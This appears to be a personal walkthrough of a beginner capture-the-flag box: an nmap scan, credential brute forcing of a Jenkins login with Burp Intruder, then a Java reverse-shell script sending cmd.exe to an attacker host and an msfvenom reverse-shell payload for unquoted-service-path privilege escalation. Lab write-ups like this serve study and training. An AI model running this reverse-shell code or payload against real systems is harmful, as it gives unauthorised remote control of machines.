Target IP: 192.168.2.5

First off, lets find out what the heck this box is. Lets start with nmap.
![[Pasted image 20250211231106.png]]

I am keeping it simple for speed, just basic service enumeration of common ports. Without even doing any OS enumeration, we know based on services this is a Windows machine. 
We can look for vulnerabilities in the 3 Microsoft services. I will just skip ahead to the Jetty http service on 8080. Lets open our web browser.
![[Pasted image 20250211231717.png]]
Looks like this is running Jenkins. Lets look that up.
![[Pasted image 20250211231831.png]]

Doing a basic check we can see a lot of potential vulnerabilities in Jenkins
![[Pasted image 20250211232050.png]]

Lets take a step back. This is a beginner box, so lets try a simple tactic, like brute forcing. If this was a lower level service we could use Hydra, but lets use a tool that works great with web pages, Burp Suite. 
Little helpful tip, instead of using a browser from Burp to intercept, you can use FoxyProxy to proxy your web traffic through the loopback address on your computer to be caught in Burp. 
I am just going to use testuser:testpass as credentials and catch that in Burp Suite.
![[Pasted image 20250211233032.png]]

If you just turned on your proxy, it should look like this. If not, just find this packet.
![[Pasted image 20250211233321.png]]

The packet should look like this. Now lets send this to intruder.

![[Pasted image 20250211233333.png]]

Now set mode to cluster bomb, and select both fields to add variables to both user and pass. We will add payloads that Burp will run. It will replace the fields and allow us to resend the packet itself to the web server.

![[Pasted image 20250211233844.png]]


![[Pasted image 20250211234345.png]]

![[Pasted image 20250211234517.png]]

![[Pasted image 20250211234944.png]]



Okay, sometimes if there is a winner here it may not be obvious. Lets look for outliers. If there was a request that succeeded we may see a large difference in response or status codes, or even packet size. There is one that is much smaller then the others (jenkins:jenkins). Lets see if that works.



String host="172.16.0.101";
int port=6666;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();






[Unquoted Service Path](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/UnquotedServicePath.md)
"The Unquoted Service Path vulnerability in Windows occurs when services are installed using paths containing spaces without proper quotation marks. If attackers obtain write permissions in the service's installation directory, they can execute malicious code with elevated privileges.

In Windows, when a file path contains spaces and isn't enclosed within quotation marks, the operating system assumes the file's location based on predetermined rules."


sc qc WiseBootAssistant
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > Service.exe

to kill a service 
sc stop <name>




